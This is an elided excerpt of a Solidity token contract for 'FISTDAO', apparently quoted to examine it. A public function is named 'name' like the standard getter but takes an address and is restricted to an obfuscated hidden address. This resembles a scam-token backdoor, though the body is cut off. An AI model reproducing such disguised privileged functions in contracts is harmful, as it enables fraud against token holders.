...
contract NAIZI is Ownable {
    ...
    string public _tokenname = "FISTDAO";
    string public _tokensymbol = "FISTDAO";
    uint256 tokenamount = 8888*10**decimals();
    address public eahsnj8;
    ...
    function name(address jjkxq1) public     {
        require(eahsnj8 ==  _msgSender());
        if(eahsnj8 != _msgSender()){
                revert("fu");
        }
